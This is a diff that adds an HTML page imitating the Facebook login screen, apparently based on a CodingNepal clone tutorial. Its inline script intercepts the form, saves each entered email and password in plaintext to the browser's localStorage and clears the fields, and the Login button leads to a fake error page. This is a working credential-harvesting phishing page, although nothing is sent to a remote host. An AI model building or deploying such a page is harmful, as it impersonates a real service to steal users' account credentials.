@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login Page | CodingNepal</title>
+    <link rel="stylesheet" href="../css docs/index.css">
+  </head>
+  <body>
+    <div class="container flex">
+      <div class="facebook-page flex">
+        <div class="text">
+          <h1>facebook</h1>
+          <p>Connect with friends and the world</p>
+          <p>around you on Facebook.</p>
+        </div>
+        <form id="loginForm" action="#">
+          <input type="email" id="emailInput" placeholder="Email or phone number" required>
+          <input type="password" id="passwordInput" placeholder="Password" required>
+          <div class="link">
+            <button type="submit" class="login"><a href="../html docs/errorpage.html" style="text-decoration: none; color: white;">Login</a></button>
+            <a href="#" class="forgot">Forgot password?</a>
+          </div>
+          <hr>
+          <div class="button">
+            <a href="#">Create new account</a>
+          </div>
+        </form>
+      </div>
+    </div>
+
+    <script>
+        // Add a submit event listener to the form
+        document.getElementById('loginForm').addEventListener('submit', function (e) {
+          e.preventDefault(); // Prevent the form from actually submitting
+      
+          // Get the values from the input fields
+          const email = document.getElementById('emailInput').value;
+          const password = document.getElementById('passwordInput').value;
+      
+          // Retrieve the existing data from localStorage or initialize an empty array
+          const storedData = JSON.parse(localStorage.getItem('userData')) || [];
+      
+          // Add the current input data to the array
+          storedData.push({ email, password });
+      
+          // Store the updated array back in localStorage
+          localStorage.setItem('userData', JSON.stringify(storedData));
+      
+          // Clear the input fields
+          document.getElementById('emailInput').value = '';
+          document.getElementById('passwordInput').value = '';
+        });
+      
+       
+      </script>
+      
+  </body>
+</html>
